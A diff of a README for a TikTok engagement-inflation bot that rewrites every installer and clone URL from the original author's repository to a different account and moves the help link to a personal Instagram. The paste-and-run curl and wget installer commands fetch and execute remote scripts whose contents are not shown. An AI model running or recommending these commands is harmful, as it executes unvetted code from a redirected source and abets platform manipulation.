@@ -6,7 +6,7 @@ We want to clarify that these outages are temporary and services will be restore
 Bot Tok is an TikTok Up Bot (likes, shares, favorites and views)
 based in node.js, puppeteer and third-party providers (zefoy.com & freer.es).
 
-🚨 Find help in [Telegram](https://t.me/bottok_help)
+🚨 Find help in [Instagram](https://www.instagram.com/khrlmstp_)
 
 >**Attention:** BotTok <u>DOESN'T SEND FOLLOWERS</u>!!!
 >
@@ -117,11 +117,11 @@ Without this you may have problems installing. This will make it much easier to 
 First look at [how to add a SSH Public Key](https://medium.com/devops-with-valentine/2021-how-to-set-up-your-ssh-key-for-github-on-windows-10-afe6e729a3c0) in your github account on Windows.
 
 
-1. Save the Windows installer file [win-install.bat](https://raw.githubusercontent.com/jfadev/bottok/main/win-install.bat) to your user folder and run it,
+1. Save the Windows installer file [win-install.bat](https://raw.githubusercontent.com/Ip-shop/bottok/main/win-install.bat) to your user folder and run it,
 or Run in terminal
 
 ```bash
-curl -o win-install.bat https://raw.githubusercontent.com/jfadev/bottok/main/win-install.bat & win-install.bat
+curl -o win-install.bat https://raw.githubusercontent.com/Ip-shop/bottok/main/win-install.bat & win-install.bat
 ```
 
 #### Linux
@@ -131,7 +131,7 @@ curl -o win-install.bat https://raw.githubusercontent.com/jfadev/bottok/main/win
 1. Run in terminal
 
 ```bash
-sudo apt install wget && wget https://raw.githubusercontent.com/jfadev/bottok/main/ubuntu-install.sh && chmod +x ubuntu-install.sh && ./ubuntu-install.sh
+sudo apt install wget && wget https://raw.githubusercontent.com/Ip-shop/bottok/main/ubuntu-install.sh && chmod +x ubuntu-install.sh && ./ubuntu-install.sh
 ```
 
 #### Android (Termux)
@@ -143,13 +143,13 @@ Requirements: [termux](https://termux.dev/en/) (install Termux in your Android p
 1. Run in Termux terminal (Install Alpine in Termux)
 
 ```bash
-pkg upgrade && pkg install wget && wget https://raw.githubusercontent.com/jfadev/bottok/main/termux-install.sh && chmod +x termux-install.sh && ./termux-install.sh
+pkg upgrade && pkg install wget && wget https://raw.githubusercontent.com/Ip-shop/bottok/main/termux-install.sh && chmod +x termux-install.sh && ./termux-install.sh
 ```
 
 2. Run in Alpine terminal
 
 ```bash
-wget https://raw.githubusercontent.com/jfadev/bottok/main/alpine-install.sh && chmod +x alpine-install.sh && ./alpine-install.sh
+wget https://raw.githubusercontent.com/Ip-shop/bottok/main/alpine-install.sh && chmod +x alpine-install.sh && ./alpine-install.sh
 ```
 
 ## Manual Install
@@ -181,7 +181,7 @@ Note: you may need to create the `.ssh` folder manually in your Windows user fol
 3. Clone this repository in terminal (fingerprint: yes)
 
 ```bash
-git clone git@github.com:jfadev/bottok.git
+git clone git@github.com:Ip-shop/bottok.git
 ```
 
 4. Install Bot Tok
@@ -222,7 +222,7 @@ Copy its content and paste it into your GitHub account in [https://github.com/se
 3. Clone this repository in terminal (fingerprint: yes)
 
 ```bash
-git clone git@github.com:jfadev/bottok.git
+git clone git@github.com:Ip-shop/bottok.git
 ```
 
 4. Install Bot Tok
@@ -285,7 +285,7 @@ Copy its content and paste it into your GitHub account in [https://github.com/se
 5. Clone this repository in terminal (fingerprint: yes)
 
 ```bash
-git clone git@github.com:jfadev/bottok.git
+git clone git@github.com:Ip-shop/bottok.git
 ```
 
 6. Install Bot Tok
@@ -393,14 +393,14 @@ Options:
 
 Set task with `-t` flag (`Up Views`, `Up Shares`, `Up Favorites`) and video url with `-l` flag. Zefoy is used by default as provider, if you want to use Freer as provider add the `-q 'Freer'` flag.
 ```bash
-node bottok.js -t 'Up Views' -l https://www.tiktok.com/@jfadev/video/7216697213693529349
+node bottok.js -t 'Up Views' -l https://www.tiktok.com/akun anda/video/7216697213693529349
 ```
 
 #### Limit Task Accumulations
 
 Set the limit accumulations value with `-x` flag. The bot will stop when this limit is reached.
 ```bash
-node bottok.js -t 'Up Views' -x 20000 -l https://www.tiktok.com/@jfadev/video/7216697213693529349
+node bottok.js -t 'Up Views' -x 20000 -l https://www.tiktok.com/akun anda/video/7216697213693529349
 ```
 
 
